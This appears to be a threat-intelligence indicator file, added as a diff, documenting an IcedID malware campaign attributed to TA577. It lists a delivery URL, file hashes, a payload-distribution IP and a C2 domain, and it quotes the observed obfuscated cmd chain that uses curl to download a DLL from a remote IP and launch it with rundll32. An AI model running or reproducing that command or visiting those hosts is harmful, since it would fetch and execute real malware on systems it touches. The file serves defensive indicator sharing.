@@ -1,0 +1,35 @@
+IcedID | 09.28.2023 | Campaign 163487289 | TA577 |
+
+***************************************
+
+.url https://themarijuanashow.com/rt/
+.zip 96183d3cd4307ff21793b4eaf54ee2c6c7e387e7c5d896f159d980eb1344301a
+.dll 1f80003416d85564aa437e72de131702a3a413b4d60611bf412f92ee9cf1f7ee
+
+***************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\4DH.pdf.lnk
+
+cmd.exe /c fbV3 || ecHO fbV3 & PiNG fbV3 || CurL http://155.138.164.116/RfOhPtl/3p -o C:\Users\Admin\AppData\Local\Temp\fbV3.log & PiNG -n 3 fbV3 || ruNdlL32 C:\Users\Admin\AppData\Local\Temp\fbV3.log  scab /k pechene634 & ExIT 'dXTUfOTzKLJv
+
+C:\Windows\system32\PING.EXE
+
+PiNG  -n 3 fbV3 
+
+ruNdlL32  C:\Users\Admin\AppData\Local\Temp\fbV3.log  scab /k pechene634 
+
+***************************************
+
+.dll distro
+
+http://155.138.164.116/RfOhPtl/3p
+
+***************************************
+
+c2 downloader
+
+http://carsfootyelo.com/
+
+***************************************
